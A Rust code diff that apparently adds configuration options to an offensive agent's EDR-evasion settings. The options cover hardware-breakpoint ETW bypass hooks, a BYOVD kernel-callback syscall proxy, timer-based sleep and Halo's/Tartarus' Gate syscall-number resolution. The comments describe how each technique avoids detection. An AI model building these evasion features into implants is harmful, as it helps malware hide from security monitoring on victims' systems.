@@ -17,6 +17,12 @@ pub enum EtwPatchMethod {
     #[default]
     Direct,
     Hwbp,
+    /// General-purpose hardware-breakpoint hooking framework (`hw_bp_hook` module).
+    /// Uses Dr0–Dr3 with a per-slot callback dispatch VEH handler.  Provides
+    /// invisible hooks that don't modify any bytes in the target function.
+    /// Falls back to `Direct` if the feature is not compiled in or if all
+    /// debug register slots are occupied.
+    HwBpHook,
 }
 
 /// Controls when the direct-patch ETW bypass is applied relative to the
@@ -46,6 +52,11 @@ pub enum ExecStrategy {
     Indirect,
     Direct,
     Fallback,
+    /// Proxy syscalls through a kernel-mode callback registered via BYOVD.
+    /// No user-mode `syscall` instruction is executed; the operation is
+    /// dispatched to a kernel callback that invokes the NT API on our behalf.
+    /// Requires the `kernel-callback` feature and a deployed vulnerable driver.
+    KernelProxy,
 }
 
 #[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
@@ -56,6 +67,12 @@ pub enum SleepMethod {
     /// Cronus-style waitable-timer sleep using NtSetTimer instead of
     /// NtDelayExecution.  Less commonly hooked by EDR.
     Cronus,
+    /// Hardware timer-based sleep using NtCreateTimer + NtSetTimer +
+    /// NtWaitForSingleObject.  Avoids NtDelayExecution entirely; the timer
+    /// fires via a different kernel path.  Uses RtlQueryPerformanceCounter
+    /// for high-resolution timestamps and targets a clean-mapped DLL gadget
+    /// for the APC callback address.
+    HardwareTimer,
     #[default]
     Standard,
 }
@@ -280,9 +297,35 @@ fn default_lsa_whisperer_auto_inject() -> bool {
 
 // ── SyscallConfig ───────────────────────────────────────────────────────────
 
+/// SSN resolution method selection.
+///
+/// Controls which strategy the agent uses to resolve NT syscall numbers
+/// when ntdll stubs are hooked by EDR.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Copy, PartialEq, Eq)]
+#[serde(rename_all = "kebab-case")]
+pub enum SsnResolutionMethod {
+    /// Halo's Gate: sorts Nt* exports by VA, scans adjacent unhooked stubs
+    /// for SSN inference.  Battle-tested, no exceptions fired.
+    HaloGate,
+    /// Tartarus' Gate (exception-based): walks the hook chain in memory and
+    /// extracts SSN from hooked prologues.  Falls back to VEH handler on
+    /// complex hooks.  No clean ntdll mapping required.
+    ExceptionBased,
+    /// Hybrid (default): tries exception-based first (faster, no syscall
+    /// pattern scan), falls back to Halo's Gate on failure.
+    Hybrid,
+}
+
+impl Default for SsnResolutionMethod {
+    fn default() -> Self {
+        Self::Hybrid
+    }
+}
+
 /// Configuration for the indirect dynamic syscall resolution subsystem.
 ///
-/// Controls how often cached SSNs are validated against the live ntdll.
+/// Controls how often cached SSNs are validated against the live ntdll
+/// and which resolution strategy to use when ntdll stubs are hooked.
 /// Only effective when the agent is compiled with the `direct-syscalls`
 /// feature.
 #[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
@@ -293,6 +336,13 @@ pub struct SyscallConfig {
     /// critical syscalls with invalid parameters.  Default: 100.
     #[serde(default = "default_syscall_validate_interval")]
     pub validate_interval: u32,
+
+    /// SSN resolution method to use when ntdll stubs are hooked.
+    /// - `halo-gate`: Classic Halo's Gate (adjacent stub scanning).
+    /// - `exception-based`: Tartarus' Gate (hook chain walking + VEH).
+    /// - `hybrid` (default): Exception-based first, Halo's Gate fallback.
+    #[serde(default)]
+    pub ssn_resolution_method: SsnResolutionMethod,
 }
 
 fn default_syscall_validate_interval() -> u32 {
@@ -303,6 +353,7 @@ impl Default for SyscallConfig {
     fn default() -> Self {
         Self {
             validate_interval: default_syscall_validate_interval(),
+            ssn_resolution_method: SsnResolutionMethod::default(),
         }
     }
 }
